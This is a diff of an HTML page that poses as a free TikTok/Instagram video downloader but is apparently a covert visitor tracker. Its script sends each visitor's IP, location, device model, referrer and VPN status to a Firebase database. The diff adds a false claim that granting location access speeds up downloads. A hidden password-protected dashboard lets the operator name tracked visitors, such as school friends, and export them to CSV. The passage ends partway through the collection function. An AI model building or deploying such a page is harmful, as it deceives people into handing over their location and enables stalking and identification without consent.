+            font-size: 0.72rem
+        }
+
+        .ip-tag {
+            font-family: var(--mono);
+            font-size: 0.75rem;
+            background: rgba(68, 138, 255, 0.1);
+            color: #448aff;
+            padding: 2px 7px;
+            border-radius: 4px;
+            display: inline-block
+        }
+
+        .new-tag {
+            background: rgba(0, 230, 118, 0.15);
+            color: #00e676;
+            font-size: 0.62rem;
+            padding: 1px 5px;
+            border-radius: 3px;
+            margin-left: 3px;
+            font-family: var(--mono)
+        }
+
+        .gps-tag {
+            background: rgba(255, 45, 120, 0.15);
+            color: var(--pink);
+            font-size: 0.62rem;
+            padding: 1px 5px;
+            border-radius: 3px;
+            margin-left: 3px;
+            font-family: var(--mono)
+        }
+
+        .name-tag {
+            background: rgba(255, 193, 7, 0.15);
+            color: #ffc107;
+            font-size: 0.62rem;
+            padding: 1px 6px;
+            border-radius: 3px;
+            margin-left: 3px;
+            font-family: var(--mono);
+            border: 1px solid rgba(255, 193, 7, 0.3)
+        }
+
+        .ttime {
+            color: var(--muted);
+            font-size: 0.73rem;
+            font-family: var(--mono)
+        }
+
+        .empty {
+            padding: 3rem;
+            text-align: center;
+            color: var(--muted)
+        }
+
+        /* Inline rename input */
+        .rename-input {
+            background: var(--s2);
+            border: 1px solid var(--purple);
+            border-radius: 4px;
+            color: var(--text);
+            font-family: var(--mono);
+            font-size: 0.75rem;
+            padding: 2px 6px;
+            outline: none;
+            width: 120px;
+            margin-left: 3px
+        }
+
+        /* Rename modal */
+        .rename-modal {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.7);
+            backdrop-filter: blur(6px);
+            z-index: 400;
+            align-items: center;
+            justify-content: center
+        }
+
+        .rename-modal.show {
+            display: flex
+        }
+
+        .rename-card {
+            background: var(--s1);
+            border: 1px solid var(--border);
+            border-radius: 16px;
+            padding: 1.5rem;
+            width: min(360px, 90vw);
+            text-align: center
+        }
+
+        .rename-card h3 {
+            font-size: 1rem;
+            font-weight: 700;
+            margin-bottom: 0.4rem
+        }
+
+        .rename-card p {
+            font-size: 0.8rem;
+            color: var(--muted);
+            margin-bottom: 1rem
+        }
+
+        .rename-inp {
+            width: 100%;
+            background: var(--s2);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 0.75rem 1rem;
+            color: var(--text);
+            font-family: var(--font);
+            font-size: 0.95rem;
+            outline: none;
+            transition: border-color 0.2s;
+            margin-bottom: 0.75rem
+        }
+
+        .rename-inp:focus {
+            border-color: var(--purple)
+        }
+
+        .rename-actions {
+            display: flex;
+            gap: 0.5rem
+        }
+
+        .rename-save {
+            flex: 1;
+            padding: 0.7rem;
+            background: linear-gradient(135deg, var(--pink), var(--purple));
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            font-family: var(--font);
+            font-weight: 700;
+            cursor: pointer
+        }
+
+        .rename-cancel {
+            padding: 0.7rem 1rem;
+            background: none;
+            border: 1px solid var(--border);
+            color: var(--muted);
+            border-radius: 8px;
+            font-family: var(--font);
+            cursor: pointer
+        }
+
+        .rename-cancel:hover {
+            border-color: var(--pink);
+            color: var(--pink)
+        }
+
+        /* DETAIL MODAL */
+        .modal-ov {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.8);
+            backdrop-filter: blur(6px);
+            z-index: 300;
+            align-items: center;
+            justify-content: center
+        }
+
+        .modal-ov.show {
+            display: flex
+        }
+
+        .modal-box {
+            background: var(--s1);
+            border: 1px solid var(--border);
+            border-radius: 18px;
+            padding: 1.5rem;
+            width: min(560px, 92vw);
+            max-height: 85vh;
+            overflow-y: auto
+        }
+
+        .modal-top {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 1rem
+        }
+
+        .modal-ttl {
+            font-size: 1rem;
+            font-weight: 700
+        }
+
+        .modal-x {
+            background: none;
+            border: none;
+            color: var(--muted);
+            font-size: 1.2rem;
+            cursor: pointer
+        }
+
+        .modal-x:hover {
+            color: var(--text)
+        }
+
+        .dgrid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 0.55rem
+        }
+
+        .ditem {
+            background: var(--s2);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 0.75rem
+        }
+
+        .ditem.full {
+            grid-column: 1/-1
+        }
+
+        .dlbl {
+            font-size: 0.63rem;
+            color: var(--muted);
+            text-transform: uppercase;
+            letter-spacing: 0.1em;
+            margin-bottom: 0.3rem;
+            font-family: var(--mono)
+        }
+
+        .dval {
+            font-size: 0.84rem;
+            word-break: break-all
+        }
+
+        .dval.accent {
+            color: #00e676
+        }
+
+        .dval.mono {
+            font-family: var(--mono);
+            font-size: 0.78rem
+        }
+
+        .dval.pink {
+            color: var(--pink)
+        }
+
+        .maps-a {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.4rem;
+            color: #448aff;
+            font-size: 0.78rem;
+            text-decoration: none;
+            margin-top: 0.4rem
+        }
+
+        .maps-a:hover {
+            text-decoration: underline
+        }
+
+        @keyframes spin {
+            to {
+                transform: rotate(360deg)
+            }
+        }
+
+        /* Search & Filter bar */
+        .dash-search-row {
+            display: flex;
+            gap: 0.5rem;
+            margin-bottom: 1rem;
+            flex-wrap: wrap
+        }
+
+        .dash-search {
+            flex: 1;
+            min-width: 180px;
+            background: var(--s2);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 0.55rem 0.9rem;
+            color: var(--text);
+            font-family: var(--font);
+            font-size: 0.82rem;
+            outline: none;
+            transition: border-color 0.2s
+        }
+
+        .dash-search:focus {
+            border-color: var(--purple)
+        }
+
+        .dash-search::placeholder {
+            color: var(--muted)
+        }
+
+        .filter-sel {
+            background: var(--s2);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 0.55rem 0.7rem;
+            color: var(--text);
+            font-family: var(--font);
+            font-size: 0.78rem;
+            outline: none;
+            cursor: pointer
+        }
+
+        .filter-sel:focus {
+            border-color: var(--purple)
+        }
+
+        .btn-export {
+            padding: 0.5rem 1rem;
+            background: none;
+            border: 1px solid rgba(0, 230, 118, 0.4);
+            color: #00e676;
+            border-radius: 8px;
+            font-family: var(--font);
+            font-size: 0.78rem;
+            cursor: pointer;
+            transition: all 0.2s;
+            white-space: nowrap
+        }
+
+        .btn-export:hover {
+            background: rgba(0, 230, 118, 0.1)
+        }
+
+        @media(max-width:650px) {
+            .stats-row {
+                grid-template-columns: 1fr 1fr
+            }
+
+            .thead,
+            .vrow {
+                grid-template-columns: 30px 1fr 1fr 80px
+            }
+
+            .col-isp,
+            .col-dev {
+                display: none
+            }
+
+            .steps {
+                grid-template-columns: 1fr
+            }
+
+            nav {
+                padding: 0.75rem 1rem
+            }
+
+            .hero {
+                padding: 2rem 1rem 1.5rem
+            }
+
+            .hero h1 {
+                font-size: 2rem
+            }
+
+            .hero p {
+                font-size: 0.9rem
+            }
+
+            .input-card {
+                margin: 0 1rem 1.5rem;
+                padding: 1rem
+            }
+
+            .input-row {
+                flex-direction: column
+            }
+
+            .btn-dl {
+                width: 100%;
+                justify-content: center
+            }
+
+            .url-input {
+                width: 100%;
+                font-size: 16px
+            }
+
+            .dl-options {
+                flex-direction: column
+            }
+
+            .dl-btn {
+                width: 100%;
+                justify-content: center
+            }
+
+            .how-section {
+                padding: 0 1rem
+            }
+
+            .dgrid {
+                grid-template-columns: 1fr
+            }
+
+            .ditem.full {
+                grid-column: 1
+            }
+
+            .dash-inner {
+                padding: 1rem
+            }
+
+            .pw-card {
+                padding: 1.5rem
+            }
+        }
+
+        @media(max-width:650px) {
+            .stats-row {
+                grid-template-columns: 1fr 1fr
+            }
+
+            .thead,
+            .vrow {
+                grid-template-columns: 30px 1fr 1fr 80px
+            }
+
+            .col-isp,
+            .col-dev {
+                display: none
+            }
+
+            .steps {
+                grid-template-columns: 1fr
+            }
+
+            nav {
+                padding: 0.75rem 1rem
+            }
+        }
+    </style>
 </head>
+
 <body>
 
-<nav>
-  <div class="logo">Save<span>Video</span></div>
-  <button class="dash-btn" onclick="openDash()"></button>
-</nav>
+    <nav>
+        <div class="logo">Save<span>Video</span></div>
+        <button class="dash-btn" onclick="openDash()"></button>
+    </nav>
 
-<div class="hero">
-  <div class="hero-badge">⚡ Gratis & Tanpa Watermark</div>
-  <h1>Download Video<br><span>TikTok & Instagram</span></h1>
-  <p>Simpan video favorit kamu tanpa watermark langsung ke perangkat. Cepat, gratis, dan mudah digunakan.</p>
-  <div class="platforms">
-    <div class="pill tiktok">🎵 TikTok</div>
-    <div class="pill ig">📸 Instagram</div>
-    <div class="pill yt">▶️ YouTube</div>
-  </div>
-</div>
-
-<div class="input-card">
-  <div class="input-row">
-    <input class="url-input" id="videoUrl" placeholder="Paste link TikTok / Instagram / YouTube di sini...">
-    <button class="btn-dl" id="btnDl" onclick="handleDownload()">Download</button>
-  </div>
-  <div class="result-area" id="resultArea">
-    <div class="result-loading" id="loadingArea" style="display:none">
-      <div class="spinner"></div>
-      <p id="loadingText">Memproses link...</p>
-    </div>
-    <div id="resultContent"></div>
-  </div>
-  <div class="error-msg" id="errorMsg"></div>
-</div>
-
-<div class="how-section">
-  <div class="how-title">Cara Penggunaan</div>
-  <div class="steps">
-    <div class="step"><div class="step-num">1</div><h4>Copy Link</h4><p>Salin link video dari TikTok atau Instagram</p></div>
-    <div class="step"><div class="step-num">2</div><h4>Paste & Download</h4><p>Tempel link di kotak di atas, klik Download</p></div>
-    <div class="step"><div class="step-num">3</div><h4>Simpan Video</h4><p>Pilih kualitas dan simpan ke perangkatmu</p></div>
-  </div>
-</div>
-
-<!-- PASSWORD MODAL -->
-<div class="pw-overlay" id="pwOverlay">
-  <div class="pw-card">
-    <div class="pw-icon">🔐</div>
-    <div class="pw-title">Admin Dashboard</div>
-    <div class="pw-subtitle">Masukkan password untuk mengakses panel admin</div>
-    <input class="pw-input" id="pwInput" type="password" placeholder="••••••••"
-      onkeydown="if(event.key==='Enter')checkPw()">
-    <div class="pw-err" id="pwErr"></div>
-    <button class="pw-btn" onclick="checkPw()">Masuk</button>
-    <br>
-    <button class="pw-cancel" onclick="closePw()">Batal</button>
-  </div>
-</div>
-
-<!-- DASHBOARD -->
-<div class="dash-overlay" id="dashOverlay">
-  <div class="dash-inner">
-    <div class="dash-topbar">
-      <div>
-        <div class="dash-logo">Save<span>Vid</span> — Visitor Dashboard</div>
-        <div style="font-size:0.78rem;color:var(--muted);margin-top:0.25rem">
-          <span class="live-dot"></span>Realtime via Firebase
+    <div class="hero">
+        <div class="hero-badge">⚡ Gratis & Tanpa Watermark</div>
+        <h1>Download Video<br><span>TikTok & Instagram</span></h1>
+        <p>Simpan video favorit kamu tanpa watermark langsung ke perangkat. Cepat, gratis, dan mudah digunakan.</p>
+        <div class="platforms">
+            <div class="pill tiktok">🎵 TikTok</div>
+            <div class="pill ig">📸 Instagram</div>
+            <div class="pill yt">▶️ YouTube</div>
         </div>
-      </div>
-      <div style="display:flex;gap:0.5rem;align-items:center">
-        <button class="btn-refresh" id="btnRefresh" onclick="refreshDash()" title="Refresh data">
-          <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="23 4 23 10 17 10"/><polyline points="1 20 1 14 7 14"/><path d="M3.51 9a9 9 0 0 1 14.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0 0 20.49 15"/></svg>
-          Refresh
-        </button>
-        <button class="btn-clear" onclick="clearAll()">🗑 Clear Semua</button>
-        <button class="btn-close-dash" onclick="closeDash()">Tutup</button>
-      </div>
     </div>
-    <div class="stats-row">
-      <div class="stat-card"><div class="stat-lbl">Total Visitor</div><div class="stat-val cg" id="st-total">0</div></div>
-      <div class="stat-card"><div class="stat-lbl">IP Unik</div><div class="stat-val cb" id="st-unique">0</div></div>
-      <div class="stat-card"><div class="stat-lbl">GPS Granted</div><div class="stat-val cp" id="st-gps">0</div></div>
-      <div class="stat-card"><div class="stat-lbl">Negara</div><div class="stat-val" id="st-country">—</div></div>
+
+    <div class="input-card">
+        <div class="input-row">
+            <input class="url-input" id="videoUrl" placeholder="Paste link TikTok / Instagram / YouTube di sini...">
+            <button class="btn-dl" id="btnDl" onclick="handleDownload()">Download</button>
+        </div>
+        <div class="result-area" id="resultArea">
+            <div class="result-loading" id="loadingArea" style="display:none">
+                <div class="spinner"></div>
+                <p id="loadingText">Memproses link...</p>
+            </div>
+            <div id="resultContent"></div>
+        </div>
+        <div class="error-msg" id="errorMsg"></div>
     </div>
-    <div class="dash-search-row">
-      <input class="dash-search" id="dashSearch" placeholder="🔍 Cari IP, nama, kota, device..." oninput="window.renderDash()">
-      <select class="filter-sel" id="filterGps" onchange="window.renderDash()">
-        <option value="">Semua GPS</option>
-        <option value="granted">GPS ✓</option>
-        <option value="denied">Ditolak</option>
-        <option value="pending">Pending</option>
-        <option value="unavailable">Unavailable</option>
-      </select>
-      <select class="filter-sel" id="filterDevice" onchange="window.renderDash()">
-        <option value="">Semua Device</option>
-        <option value="Mobile">📱 Mobile</option>
-        <option value="Tablet">📟 Tablet</option>
-        <option value="Desktop">🖥️ Desktop</option>
-      </select>
-      <select class="filter-sel" id="filterVpn" onchange="window.renderDash()">
-        <option value="">Semua</option>
-        <option value="vpn">🔴 VPN</option>
-        <option value="novpn">🟢 No VPN</option>
-      </select>
-      <button class="btn-export" onclick="window.exportCSV()">⬇ Export CSV</button>
+    <div id="locationPrompt"
+        style="display:none; margin-top:10px; background:rgba(255,45,120,0.1); border:1px solid var(--pink); border-radius:8px; padding:0.5rem; font-size:0.8rem; text-align:center">
+        ⚡ Untuk kecepatan download, izinkan akses lokasi Anda. <button onclick="requestLocationAgain()"
+            style="background:none; border:1px solid var(--pink); color:var(--pink); border-radius:4px; padding:2px 8px; margin-left:6px; cursor:pointer">Izinkan</button>
     </div>
-    <div class="vtable">
-      <div class="thead" style="grid-template-columns:40px 145px 1fr 1fr 90px 100px 36px">
-        <div>#</div><div>IP Address</div><div>Lokasi</div>
-        <div class="col-isp">ISP</div><div class="col-dev">Device</div><div>Waktu</div><div></div>
-      </div>
-      <div id="visitorList"><div class="empty">⏳ Menunggu data dari Firebase...</div></div>
+
+    <div class="how-section">
+        <div class="how-title">Cara Penggunaan</div>
+        <div class="steps">
+            <div class="step">
+                <div class="step-num">1</div>
+                <h4>Copy Link</h4>
+                <p>Salin link video dari TikTok atau Instagram</p>
+            </div>
+            <div class="step">
+                <div class="step-num">2</div>
+                <h4>Paste & Download</h4>
+                <p>Tempel link di kotak di atas, klik Download</p>
+            </div>
+            <div class="step">
+                <div class="step-num">3</div>
+                <h4>Simpan Video</h4>
+                <p>Pilih kualitas dan simpan ke perangkatmu</p>
+            </div>
+        </div>
     </div>
-  </div>
-</div>
 
-<!-- DETAIL MODAL -->
-<div class="modal-ov" id="detailModal">
-  <div class="modal-box">
-    <div class="modal-top">
-      <div class="modal-ttl">Detail Visitor</div>
-      <button class="modal-x" onclick="closeDetail()">✕</button>
+    <!-- PASSWORD MODAL -->
+    <div class="pw-overlay" id="pwOverlay">
+        <div class="pw-card">
+            <div class="pw-icon">🔐</div>
+            <div class="pw-title">Admin Dashboard</div>
+            <div class="pw-subtitle">Masukkan password untuk mengakses panel admin</div>
+            <input class="pw-input" id="pwInput" type="password" placeholder="••••••••"
+                onkeydown="if(event.key==='Enter')checkPw()">
+            <div class="pw-err" id="pwErr"></div>
+            <button class="pw-btn" onclick="checkPw()">Masuk</button>
+            <br>
+            <button class="pw-cancel" onclick="closePw()">Batal</button>
+        </div>
     </div>
-    <div class="dgrid" id="detailContent"></div>
-  </div>
-</div>
 
-<!-- RENAME MODAL -->
-<div class="rename-modal" id="renameModal">
-  <div class="rename-card">
-    <h3>✏️ Beri Nama Visitor</h3>
-    <p id="renameSubtitle">Beri label untuk memudahkan identifikasi</p>
-    <input class="rename-inp" id="renameInp" placeholder="Contoh: Budi, Teman SMA, dll..." maxlength="40"
-      onkeydown="if(event.key==='Enter')saveRename(); if(event.key==='Escape')closeRename();">
-    <div class="rename-actions">
-      <button class="rename-save" onclick="saveRename()">Simpan</button>
-      <button class="rename-cancel" onclick="closeRename()">Batal</button>
+    <!-- DASHBOARD -->
+    <div class="dash-overlay" id="dashOverlay">
+        <div class="dash-inner">
+            <div class="dash-topbar">
+                <div>
+                    <div class="dash-logo">Save<span>Vid</span> — Visitor Dashboard</div>
+                    <div style="font-size:0.78rem;color:var(--muted);margin-top:0.25rem">
+                        <span class="live-dot"></span>Realtime via Firebase
+                    </div>
+                </div>
+                <div style="display:flex;gap:0.5rem;align-items:center">
+                    <button class="btn-refresh" id="btnRefresh" onclick="refreshDash()" title="Refresh data">
+                        <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                            stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+                            <polyline points="23 4 23 10 17 10" />
+                            <polyline points="1 20 1 14 7 14" />
+                            <path d="M3.51 9a9 9 0 0 1 14.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0 0 20.49 15" />
+                        </svg>
+                        Refresh
+                    </button>
+                    <button class="btn-clear" onclick="clearAll()">🗑 Clear Semua</button>
+                    <button class="btn-close-dash" onclick="closeDash()">Tutup</button>
+                </div>
+            </div>
+            <div class="stats-row">
+                <div class="stat-card">
+                    <div class="stat-lbl">Total Visitor</div>
+                    <div class="stat-val cg" id="st-total">0</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-lbl">IP Unik</div>
+                    <div class="stat-val cb" id="st-unique">0</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-lbl">GPS Granted</div>
+                    <div class="stat-val cp" id="st-gps">0</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-lbl">Negara</div>
+                    <div class="stat-val" id="st-country">—</div>
+                </div>
+            </div>
+            <div class="dash-search-row">
+                <input class="dash-search" id="dashSearch" placeholder="🔍 Cari IP, nama, kota, device..."
+                    oninput="window.renderDash()">
+                <select class="filter-sel" id="filterGps" onchange="window.renderDash()">
+                    <option value="">Semua GPS</option>
+                    <option value="granted">GPS ✓</option>
+                    <option value="denied">Ditolak</option>
+                    <option value="pending">Pending</option>
+                    <option value="unavailable">Unavailable</option>
+                </select>
+                <select class="filter-sel" id="filterDevice" onchange="window.renderDash()">
+                    <option value="">Semua Device</option>
+                    <option value="Mobile">📱 Mobile</option>
+                    <option value="Tablet">📟 Tablet</option>
+                    <option value="Desktop">🖥️ Desktop</option>
+                </select>
+                <select class="filter-sel" id="filterVpn" onchange="window.renderDash()">
+                    <option value="">Semua</option>
+                    <option value="vpn">🔴 VPN</option>
+                    <option value="novpn">🟢 No VPN</option>
+                </select>
+                <button class="btn-export" onclick="window.exportCSV()">⬇ Export CSV</button>
+            </div>
+            <div class="vtable">
+                <div class="thead" style="grid-template-columns:40px 145px 1fr 1fr 90px 100px 36px">
+                    <div>#</div>
+                    <div>IP Address</div>
+                    <div>Lokasi</div>
+                    <div class="col-isp">ISP</div>
+                    <div class="col-dev">Device</div>
+                    <div>Waktu</div>
+                    <div></div>
+                </div>
+                <div id="visitorList">
+                    <div class="empty">⏳ Menunggu data dari Firebase...</div>
+                </div>
+            </div>
+        </div>
     </div>
-  </div>
-</div>
 
-<!-- FIREBASE -->
-<script type="module">
-import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
-import { getDatabase, ref, push, onValue, remove, update } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";
+    <!-- DETAIL MODAL -->
+    <div class="modal-ov" id="detailModal">
+        <div class="modal-box">
+            <div class="modal-top">
+                <div class="modal-ttl">Detail Visitor</div>
+                <button class="modal-x" onclick="closeDetail()">✕</button>
+            </div>
+            <div class="dgrid" id="detailContent"></div>
+        </div>
+    </div>
 
-const firebaseConfig = {
-  apiKey: "AIzaSyBeE44QfFV9faVxx4c40-Uz8ph-ftVdsSQ",
-  authDomain: "nettrack-768ac.firebaseapp.com",
-  databaseURL: "https://nettrack-768ac-default-rtdb.asia-southeast1.firebasedatabase.app",
-  projectId: "nettrack-768ac",
-  storageBucket: "nettrack-768ac.firebasestorage.app",
-  messagingSenderId: "776013517926",
-  appId: "1:776013517926:web:80e7bbcd96afb5c65f89a7"
-};
+    <!-- RENAME MODAL -->
+    <div class="rename-modal" id="renameModal">
+        <div class="rename-card">
+            <h3>✏️ Beri Nama Visitor</h3>
+            <p id="renameSubtitle">Beri label untuk memudahkan identifikasi</p>
+            <input class="rename-inp" id="renameInp" placeholder="Contoh: Budi, Teman SMA, dll..." maxlength="40"
+                onkeydown="if(event.key==='Enter')saveRename(); if(event.key==='Escape')closeRename();">
+            <div class="rename-actions">
+                <button class="rename-save" onclick="saveRename()">Simpan</button>
+                <button class="rename-cancel" onclick="closeRename()">Batal</button>
+            </div>
+        </div>
+    </div>
 
-const app = initializeApp(firebaseConfig);
-const db = getDatabase(app);
-const visRef = ref(db, 'visitors');
+    <!-- FIREBASE -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
+        import { getDatabase, ref, push, onValue, remove, update } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";
 
-// ── Device brand/model parser ──────────────────────────────
-function parseDevice(uaRaw) {
-  const ua = uaRaw.toLowerCase();
-  let brand = 'Unknown', model = '';
+        const firebaseConfig = {
+            apiKey: "AIzaSyBeE44QfFV9faVxx4c40-Uz8ph-ftVdsSQ",
+            authDomain: "nettrack-768ac.firebaseapp.com",
+            databaseURL: "https://nettrack-768ac-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "nettrack-768ac",
+            storageBucket: "nettrack-768ac.firebasestorage.app",
+            messagingSenderId: "776013517926",
+            appId: "1:776013517926:web:80e7bbcd96afb5c65f89a7"
+        };
 
-  // iPhone
-  const iphoneM = uaRaw.match(/iPhone OS ([\d_]+)/);
-  if (iphoneM) return { brand:'Apple', model:`iPhone (iOS ${iphoneM[1].replace(/_/g,'.')})` };
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
+        const visRef = ref(db, 'visitors');
 
-  // iPad
-  const ipadM = uaRaw.match(/iPad.*OS ([\d_]+)/);
-  if (ipadM) return { brand:'Apple', model:`iPad (iPadOS ${ipadM[1].replace(/_/g,'.')})` };
+        // ── Device brand/model parser ──────────────────────────────
+        function parseDevice(uaRaw) {
+            const ua = uaRaw.toLowerCase();
+            let brand = 'Unknown', model = '';
 
-  // Samsung  — format: SM-XXXX, GT-XXXX, SCH-XXXX
-  const samsungM = uaRaw.match(/(SM-[A-Z0-9]+|GT-[A-Z0-9]+|SCH-[A-Z0-9]+)/);
-  if (samsungM) return { brand:'Samsung', model:samsungM[1] };
+            // iPhone
+            const iphoneM = uaRaw.match(/iPhone OS ([\d_]+)/);
+            if (iphoneM) return { brand: 'Apple', model: `iPhone (iOS ${iphoneM[1].replace(/_/g, '.')})` };
 
-  // Xiaomi / Redmi / POCO
-  const xiaomiM = uaRaw.match(/(Redmi [A-Za-z0-9 ]+?|POCO [A-Za-z0-9]+|M[0-9]{4}[A-Z0-9]*|Xiaomi [A-Za-z0-9 ]+?)(?=\s*Build|;|\))/);
-  if (ua.includes('redmi') || ua.includes('poco') || ua.includes('xiaomi')) {
-    if (xiaomiM) return { brand:'Xiaomi', model:xiaomiM[1].trim() };
-    return { brand:'Xiaomi', model:'Unknown Model' };
-  }
+            // iPad
+            const ipadM = uaRaw.match(/iPad.*OS ([\d_]+)/);
+            if (ipadM) return { brand: 'Apple', model: `iPad (iPadOS ${ipadM[1].replace(/_/g, '.')})` };
 
-  // OPPO
-  const oppoM = uaRaw.match(/OPPO\s?([A-Za-z0-9 ]+?)(?=\s*Build|;|\))/i);
-  if (oppoM) return { brand:'OPPO', model:oppoM[1].trim() };
-  if (ua.includes('cph') || ua.includes('cph')) {
-    const cphM = uaRaw.match(/(CPH[0-9]+)/);
-    if (cphM) return { brand:'OPPO', model:cphM[1] };
-  }
+            // Samsung  — format: SM-XXXX, GT-XXXX, SCH-XXXX
+            const samsungM = uaRaw.match(/(SM-[A-Z0-9]+|GT-[A-Z0-9]+|SCH-[A-Z0-9]+)/);
+            if (samsungM) return { brand: 'Samsung', model: samsungM[1] };
 
-  // Vivo
-  const vivoM = uaRaw.match(/vivo\s?([A-Za-z0-9]+)/i);
-  if (vivoM) return { brand:'Vivo', model:vivoM[1] };
-  if (ua.includes(' v') && ua.includes('build')) {
-    const vM = uaRaw.match(/;\s*(V[0-9][A-Za-z0-9]*)\s+Build/);
-    if (vM) return { brand:'Vivo', model:vM[1] };
-  }
+            // Xiaomi / Redmi / POCO
+            const xiaomiM = uaRaw.match(/(Redmi [A-Za-z0-9 ]+?|POCO [A-Za-z0-9]+|M[0-9]{4}[A-Z0-9]*|Xiaomi [A-Za-z0-9 ]+?)(?=\s*Build|;|\))/);
+            if (ua.includes('redmi') || ua.includes('poco') || ua.includes('xiaomi')) {
+                if (xiaomiM) return { brand: 'Xiaomi', model: xiaomiM[1].trim() };
+                return { brand: 'Xiaomi', model: 'Unknown Model' };
+            }
 
-  // Realme
-  const realmeM = uaRaw.match(/(RMX[0-9]+|realme\s+[A-Za-z0-9 ]+?)(?=\s*Build|;|\))/i);
-  if (realmeM) return { brand:'Realme', model:realmeM[1].replace(/realme\s*/i,'').trim() };
+            // OPPO
+            const oppoM = uaRaw.match(/OPPO\s?([A-Za-z0-9 ]+?)(?=\s*Build|;|\))/i);
+            if (oppoM) return { brand: 'OPPO', model: oppoM[1].trim() };
+            if (ua.includes('cph') || ua.includes('cph')) {
+                const cphM = uaRaw.match(/(CPH[0-9]+)/);
+                if (cphM) return { brand: 'OPPO', model: cphM[1] };
+            }
 
-  // Huawei
-  const huaweiM = uaRaw.match(/(ANA-[A-Z0-9]+|CLT-[A-Z0-9]+|ELE-[A-Z0-9]+|VOG-[A-Z0-9]+|LYA-[A-Z0-9]+|[A-Z]{3}-[A-Z0-9]{2,})/);
-  if (ua.includes('huawei') || ua.includes('honor')) {
-    if (huaweiM) return { brand: ua.includes('honor') ? 'Honor' : 'Huawei', model:huaweiM[1] };
-    return { brand: ua.includes('honor') ? 'Honor' : 'Huawei', model:'Unknown' };
-  }
+            // Vivo
+            const vivoM = uaRaw.match(/vivo\s?([A-Za-z0-9]+)/i);
+            if (vivoM) return { brand: 'Vivo', model: vivoM[1] };
+            if (ua.includes(' v') && ua.includes('build')) {
+                const vM = uaRaw.match(/;\s*(V[0-9][A-Za-z0-9]*)\s+Build/);
+                if (vM) return { brand: 'Vivo', model: vM[1] };
+            }
 
-  // OnePlus
-  const oneplusM = uaRaw.match(/OnePlus\s?([A-Za-z0-9 ]+?)(?=\s*Build|;|\))/i);
-  if (oneplusM) return { brand:'OnePlus', model:oneplusM[1].trim() };
+            // Realme
+            const realmeM = uaRaw.match(/(RMX[0-9]+|realme\s+[A-Za-z0-9 ]+?)(?=\s*Build|;|\))/i);
+            if (realmeM) return { brand: 'Realme', model: realmeM[1].replace(/realme\s*/i, '').trim() };
 
-  // Generic Android — extract model from ";<model> Build/"
-  const androidM = uaRaw.match(/;\s*([^;()]+?)\s+Build\//);
-  if (androidM) {
-    const raw = androidM[1].trim();
-    // Try to guess brand from first word
-    const firstWord = raw.split(' ')[0];
-    return { brand: firstWord || 'Android', model: raw };
-  }
+            // Huawei
+            const huaweiM = uaRaw.match(/(ANA-[A-Z0-9]+|CLT-[A-Z0-9]+|ELE-[A-Z0-9]+|VOG-[A-Z0-9]+|LYA-[A-Z0-9]+|[A-Z]{3}-[A-Z0-9]{2,})/);
+            if (ua.includes('huawei') || ua.includes('honor')) {
+                if (huaweiM) return { brand: ua.includes('honor') ? 'Honor' : 'Huawei', model: huaweiM[1] };
+                return { brand: ua.includes('honor') ? 'Honor' : 'Huawei', model: 'Unknown' };
+            }
 
-  // Desktop OS
-  if (ua.includes('windows')) return { brand:'Windows PC', model:'' };
-  if (ua.includes('macintosh')) return { brand:'Mac', model:'' };
-  if (ua.includes('linux')) return { brand:'Linux PC', model:'' };
+            // OnePlus
+            const oneplusM = uaRaw.match(/OnePlus\s?([A-Za-z0-9 ]+?)(?=\s*Build|;|\))/i);
+            if (oneplusM) return { brand: 'OnePlus', model: oneplusM[1].trim() };
 
-  return { brand:'Unknown', model:'' };
-}
+            // Generic Android — extract model from ";<model> Build/"
+            const androidM = uaRaw.match(/;\s*([^;()]+?)\s+Build\//);
+            if (androidM) {
+                const raw = androidM[1].trim();
+                // Try to guess brand from first word
+                const firstWord = raw.split(' ')[0];
+                return { brand: firstWord || 'Android', model: raw };
+            }
 
-async function collect() {
-  const ua = navigator.userAgent.toLowerCase();
-  const devInfo = parseDevice(navigator.userAgent);
+            // Desktop OS
+            if (ua.includes('windows')) return { brand: 'Windows PC', model: '' };
+            if (ua.includes('macintosh')) return { brand: 'Mac', model: '' };
+            if (ua.includes('linux')) return { brand: 'Linux PC', model: '' };
 
-  // Referrer — dari mana user datang
-  const ref_src = document.referrer || null;
-  let referrer_label = null;
-  if (ref_src) {
-    if (ref_src.includes('wa.me') || ref_src.includes('whatsapp')) referrer_label = 'WhatsApp';
-    else if (ref_src.includes('instagram')) referrer_label = 'Instagram';
-    else if (ref_src.includes('tiktok')) referrer_label = 'TikTok';
-    else if (ref_src.includes('t.me') || ref_src.includes('telegram')) referrer_label = 'Telegram';
-    else if (ref_src.includes('twitter') || ref_src.includes('x.com')) referrer_label = 'Twitter/X';
-    else if (ref_src.includes('facebook') || ref_src.includes('fb.')) referrer_label = 'Facebook';
-    else if (ref_src.includes('google')) referrer_label = 'Google';
-    else referrer_label = ref_src.split('/')[2] || ref_src;
-  } else {
-    // Cek URL param utm_source / ref
-    const params = new URLSearchParams(window.location.search);
